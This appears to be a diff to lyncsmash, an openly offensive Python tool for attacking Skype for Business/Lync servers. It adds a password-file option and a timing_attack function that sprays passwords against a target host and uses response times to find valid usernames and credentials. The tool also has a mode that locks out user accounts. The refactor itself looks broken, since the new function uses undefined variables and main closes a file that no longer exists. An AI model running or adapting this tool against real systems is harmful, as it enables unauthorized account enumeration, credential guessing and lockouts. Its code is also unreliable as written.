@@ -1,4 +1,13 @@
 #!/usr/bin/env python
+
+# lyncsmash: a tool to enumerate and attack skype for business/microsoft lync installations
+# https://github.com/nyxgeek/lyncsmash
+#
+# 2017 @nyxgeek - TrustedSec
+# Special thanks to @coldfusion39 who did a big re-write of my shoddy python
+# also thanks to @shellfail and @spoonman1091 for updates and fixes
+
+
 import argparse
 import base64
 import os
@@ -25,7 +34,8 @@ def main():
         enum_parser.add_argument('-H', dest='host', help='Target IP address or host', required=True)
         enum_parser.add_argument('-U', dest='usernames', help='Username file', required=True)
         enum_parser.add_argument('-d', dest='domain', help='Internal domain name', required=True)
-        enum_parser.add_argument('-p', dest='passwd', help='Password to attempt', required=True)
+        enum_parser.add_argument('-p', dest='passwd', help='Password to attempt', required=False)
+        enum_parser.add_argument('-P', dest='passwdfile', help='Password file to read from', required=False)
 
         lock_parser = subparsers.add_parser('lock', help='Lock Lync user account')
         lock_parser.add_argument('-H', dest='host', help='Target IP address or host', required=True)
@@ -40,28 +50,32 @@ def main():
 
         # Enumerate valid Lync usernames
         elif args.attack == 'enum':
+                if ((args.passwd, args.passwdfile) == (None, None)):
+                       print_error('You need to specify either a password or a password file to use')
+                       exit()
+                if all((args.passwd, args.passwdfile)):
+                       print_error('You cant have both a passwd file and passwd specified')
+                       exit()
+
                 if os.path.isfile(args.usernames):
                         print_status('Getting timeout baseline')
                         timeout = baseline_timeout(args.host, args.domain)
                         if timeout:
                                 print_status("Average timeout is: {0}".format(timeout))
 
-                                with open(args.passwd) as pass_file:
+
+                                if (args.passwd != None):
+                                    timing_attack(args.host.rstrip(), args.usernames.rstrip(), args.passwd.rstrip(), args.domain.rstrip()) 
+
+                                if (args.passwdfile != None):
+                                    with open(args.passwdfile) as pass_file:
                                         for password in pass_file:
-                                                with open(os.path.abspath(args.usernames)) as user_file:
-                                                        for user in user_file:
-                                                            response_time = send_xml(args.host, args.domain, user.rstrip(),password.rstrip())
-                                                            print_status("Testing Credentials {0}:{1}".format(user.rstrip(), password.rstrip()))
-                                                            print_status("Time for {0}: {1}".format(user.rstrip(), response_time))
-                                                            candidatevalue=float(float(response_time)/timeout)
-                                                            if candidatevalue <= float("0.4"):
-                                                                    if validCred:
-                                                                        print_good("VALID CREDENTIALS: {0}:{1}".format(user.rstrip(), password.rstrip()))
-                                                                    else:
-                                                                        print_good("Valid User, Invalid Password: {0}".format(user.rstrip()))
-                                                            print ''
+                                            timing_attack(args.host.rstrip(), args.usernames.rstrip(), password.rstrip(), args.domain.rstrip()) 
+
+                                    pass_file.close()
+
+
                                 user_file.close()
-                                pass_file.close()
                 else:
                         print_error('Could not find username file')
 
@@ -120,6 +134,20 @@ def discover_lync(host):
         }
 
         return indicator_count, switch.get(indicator_count, 'Definitely')
+
+def timing_attack(host,userfilepath,password,domain):
+    with open(os.path.abspath(userfilepath)) as user_file:
+         for user in user_file:
+             response_time = send_xml(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
+             print_status("Testing Credentials {0}:{1}".format(user.rstrip(), password))
+             print_status("Time for {0}: {1}".format(user.rstrip(), response_time))
+             candidatevalue=float(float(response_time)/timeout)
+             if candidatevalue <= float("0.4"):
+                 if validCred:
+                     print_good("VALID CREDENTIALS: {0}:{1}".format(user, password))
+                 else:
+                     print_good("Valid User, Invalid Password: {0}".format(user))
+             print ''
 
 
 # Determine the baseline timeout for invalid username
